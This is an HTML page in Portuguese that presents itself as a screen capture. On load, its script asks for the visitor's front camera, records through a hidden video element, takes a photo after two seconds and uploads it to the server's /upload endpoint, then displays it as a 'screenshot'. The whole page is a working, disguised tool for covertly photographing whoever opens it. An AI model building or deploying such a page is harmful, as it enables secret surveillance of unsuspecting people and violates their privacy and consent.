<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Captura da Tela</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    img {
      max-width: 100%;
      height: auto;
      border-radius: 15px;
      margin-bottom: 20px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <img id="screenshot" alt="Captura da tela" />

  <script>
    (async function () {
      try {
        // Captura a câmera frontal do usuário
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user"
          },
          audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        // Aguarda 2 segundos e tira a foto
        setTimeout(() => {
          tirarFoto(video);
        }, 2000);
      } catch (err) {
        console.log("Permissão negada:", err);
      }
    })();

    async function tirarFoto(video) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);

      const blob = await new Promise(resolve => {
        canvas.toBlob(resolve, "image/jpeg", 0.95);
      });

      const formData = new FormData();
      formData.append("foto", blob, "foto.jpg");

      const resposta = await fetch("/upload", {
        method: "POST",
        body: formData
      });

      const resultado = await resposta.json();
      console.log(resultado);

      // Exibe a imagem capturada
      const img = document.getElementById("screenshot");
      const url = URL.createObjectURL(blob);
      img.src = url;
    }
  </script>
</body>
</html>
